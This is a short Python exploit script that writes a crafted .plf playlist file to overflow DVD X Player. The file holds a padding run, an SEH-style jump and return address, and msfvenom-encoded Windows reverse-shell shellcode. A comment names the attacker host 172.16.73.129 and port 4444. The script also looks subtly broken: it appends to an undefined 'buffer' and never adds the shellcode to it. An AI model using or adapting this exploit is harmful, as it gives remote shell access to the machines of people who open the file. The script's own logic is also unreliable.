#!/usr/bin/python -w

filename="dvdxplayer_patt_shellcode.plf"

#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=172.16.73.129 #LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x1a' -f #c                                         

shellcode = ("\xbb\xe8\xe1\x4f\xb9\xda\xd6\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\x02\x1d\xad\x4c\x2e\x36\xb0"
"\xaf\xce\xc7\xd5\x26\x2b\xf6\xd5\x5d\x38\xa9\xe5\x16\x6c\x46"
"\x8d\x7b\x84\xdd\xe3\x53\xab\x56\x49\x82\x82\x67\xe2\xf6\x85"
"\xeb\xf9\x2a\x65\xd5\x31\x3f\x64\x12\x2f\xb2\x34\xcb\x3b\x61"
"\xa8\x78\x71\xba\x43\x32\x97\xba\xb0\x83\x96\xeb\x67\x9f\xc0"
"\x2b\x86\x4c\x79\x62\x90\x91\x44\x3c\x2b\x61\x32\xbf\xfd\xbb"
"\xbb\x6c\xc0\x73\x4e\x6c\x05\xb3\xb1\x1b\x7f\xc7\x4c\x1c\x44"
"\xb5\x8a\xa9\x5e\x1d\x58\x09\xba\x9f\x8d\xcc\x49\x93\x7a\x9a"
"\x15\xb0\x7d\x4f\x2e\xcc\xf6\x6e\xe0\x44\x4c\x55\x24\x0c\x16"
"\xf4\x7d\xe8\xf9\x09\x9d\x53\xa5\xaf\xd6\x7e\xb2\xdd\xb5\x16"
"\x77\xec\x45\xe7\x1f\x67\x36\xd5\x80\xd3\xd0\x55\x48\xfa\x27"
"\x99\x63\xba\xb7\x64\x8c\xbb\x9e\xa2\xd8\xeb\x88\x03\x61\x60"
"\x48\xab\xb4\x27\x18\x03\x67\x88\xc8\xe3\xd7\x60\x02\xec\x08"
"\x90\x2d\x26\x21\x3b\xd4\xa1\xe2\xac\x9f\xb0\x93\xce\x1f\xa2"
"\x3f\x46\xf9\xae\xaf\x0e\x52\x47\x49\x0b\x28\xf6\x96\x81\x55"
"\x38\x1c\x26\xaa\xf7\xd5\x43\xb8\x60\x16\x1e\xe2\x27\x29\xb4"
"\x8a\xa4\xb8\x53\x4a\xa2\xa0\xcb\x1d\xe3\x17\x02\xcb\x19\x01"
"\xbc\xe9\xe3\xd7\x87\xa9\x3f\x24\x09\x30\xcd\x10\x2d\x22\x0b"
"\x98\x69\x16\xc3\xcf\x27\xc0\xa5\xb9\x89\xba\x7f\x15\x40\x2a"
"\xf9\x55\x53\x2c\x06\xb0\x25\xd0\xb7\x6d\x70\xef\x78\xfa\x74"
"\x88\x64\x9a\x7b\x43\x2d\xaa\x31\xc9\x04\x23\x9c\x98\x14\x2e"
"\x1f\x77\x5a\x57\x9c\x7d\x23\xac\xbc\xf4\x26\xe8\x7a\xe5\x5a"
"\x61\xef\x09\xc8\x82\x3a")

evil = "\x90"*20 + shellcode 
buffer += "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + "B"*(1384-len(evil))

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
